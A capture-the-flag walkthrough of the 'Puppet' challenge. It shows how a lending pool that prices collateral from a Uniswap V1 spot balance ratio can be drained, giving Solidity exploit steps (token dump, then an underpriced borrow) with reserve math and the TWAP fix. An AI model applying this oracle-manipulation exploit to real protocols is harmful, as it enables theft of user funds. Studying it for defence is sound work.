## Challenge 8 Walkthrough: Puppet

### Vulnerability

The vulnerability lies in `PuppetPool._computeOraclePrice()`:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This is a **raw spot price** — the instantaneous ratio of ETH reserves to DVT reserves in the Uniswap V1 pair. It has no time-weighting, no TWAP window, no manipulation resistance of any kind. The collateral requirement is derived directly from it:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    //                         ↑
    //             uniswapPair.balance * 1e18 / token.balanceOf(uniswapPair)
    //             raw balance ratio — moves instantly with any swap
}
```

The initial state: 10 ETH / 10 DVT in the Uniswap pool → price = 1 ETH per DVT → borrowing 100,000 DVT requires 200,000 ETH collateral. With only 10 ETH of initial liquidity, a large token dump is enough to collapse the price by orders of magnitude in a single transaction.

### Exploit

```solidity
function test_puppet() public checkSolvedByPlayer {
    PuppetAttacker attacker = new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
        token, lendingPool, uniswapV1Exchange, recovery
    );
    token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
    attacker.attack(POOL_INITIAL_TOKEN_BALANCE);
}
```

Deploying `PuppetAttacker` and calling `attack()` counts as one transaction — satisfying `vm.getNonce(player) == 1`. All logic runs inside the constructor deployment and a single `attack()` call routed through the helper contract.

**Inside `attack()`:**

**Step 1 — Dump 1,000 DVT into the Uniswap V1 pool:**
```solidity
token.approve(address(uniswapV1Exchange), tokenBalance);
uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
```

Reserve state before and after:

| | ETH reserve | DVT reserve | `_computeOraclePrice()` |
|-|-------------|-------------|------------------------|
| Before | 10 ETH | 10 DVT | 1.0 ETH per DVT |
| After dump | ~0.091 ETH | ~1010 DVT | ~0.000091 ETH per DVT |

Price has crashed ~11,000x. The Uniswap constant product formula (`x * y = k`) means dumping 1,000 DVT into a 10 DVT pool pushes most of the ETH out and leaves the pool token-heavy.

**Step 2 — Borrow all 100,000 DVT for ~20 ETH:**
```solidity
lendingPool.borrow{value: 20 ether}(borrowAmount, recovery);
```

`calculateDepositRequired(100_000e18)` after the dump:
```
= 100_000e18 * (0.091e18 / 1010e18) * 2 / 1e18
≈ 18 ETH
```

Well within the player's 25 ETH starting balance. The pool releases all 100,000 DVT directly to `recovery`.

### Why It Works

The root cause is using a Uniswap V1 spot price — a raw balance ratio — as the sole collateral oracle. Spot price reflects the current state of a single pool and can be moved to any value in a single transaction by anyone with enough tokens to trade. With only 10 ETH of initial liquidity, the player's 1,000 DVT is more than enough to make the price arbitrarily small.

Uniswap V1 was designed as a DEX, not a price oracle. Its prices are intended to be corrected by arbitrageurs over time — not to be read atomically in the same block as a manipulation trade.

The fix used in Puppet V2 and V3 is a TWAP (Time-Weighted Average Price) oracle that accumulates price over multiple blocks, making single-block manipulation economically infeasible since an attacker would need to hold a manipulated price for many blocks while losing money to arbitrage.

This is a **spot price oracle manipulation** attack — one transaction, ~11,000x price crash, 100,000 DVT borrowed for 18 ETH.

**Related challenges:** SCH's `dex-2 (Sniper)` lab uses the same Uniswap V2 reserve-reading primitives that Puppet V2 drains via spot price (and the same conceptual primitives as Puppet V1, scaled up to V2's `getReserves` / `getAmountOut` math). It's a useful exercise for internalizing how reserve ratios respond to swaps before applying that intuition to the oracle-manipulation framing.
